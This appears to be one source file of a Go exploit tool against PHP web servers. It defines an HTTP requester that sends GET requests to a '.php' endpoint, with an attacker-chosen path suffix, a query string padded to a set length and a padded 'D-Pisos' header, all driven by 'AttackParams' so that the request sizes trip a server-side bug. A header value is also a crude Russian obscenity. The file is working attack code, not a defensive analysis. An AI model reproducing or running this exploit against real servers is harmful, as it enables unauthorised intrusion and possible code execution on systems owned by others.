package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type Requester struct {
	cl     *http.Client
	u      *url.URL
	cookie string
}

func NewRequester(resource, cookie string) (*Requester, error) {
	u, err := url.Parse(resource)
	if err != nil {
		return nil, fmt.Errorf("url.Parse failed: %v", err)
	}
	if !strings.HasSuffix(u.Path, ".php") {
		return nil, fmt.Errorf("well I believe the url must end with \".php\". " +
			"Maybe I'm wrong, delete this check if you feel like it")
	}

	nextProto := make(map[string]func(authority string, c *tls.Conn) http.RoundTripper)
	return &Requester{
		cl: &http.Client{
			Transport: &http.Transport{
				DisableCompression: true,      // No "Accept-Encoding"
				TLSNextProto:       nextProto, // No http2
			},
			Timeout: 30 * time.Second,
		},
		u:      u,
		cookie: cookie,
	}, nil
}

func (r *Requester) Request(pathInfo string, params *AttackParams) (*http.Response, []byte, error) {
	if !strings.HasPrefix(pathInfo, "/") {
		return nil, nil, fmt.Errorf("path doesn't start with slash: %#v", pathInfo)
	}
	u := *r.u
	u.RawQuery = strings.Repeat("Q", params.QueryStringLength)
	u.Path += pathInfo
	req, err := http.NewRequest("GET", u.String(), nil)
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("User-Agent", UserAgent)
	if r.cookie != "" {
		req.Header.Set("Cookie", r.cookie)
	}
	req.Header.Set("D-Pisos", "8"+strings.Repeat("=", params.PisosLength)+"D")
	req.Header.Set("Ebut", "mamku tvoyu")
	resp, err := r.cl.Do(req)
	if resp != nil {
		defer func() { _ = resp.Body.Close() }()
	}
	if err != nil {
		return nil, nil, err
	}
	data, err := ioutil.ReadAll(resp.Body)
	return resp, data, err
}
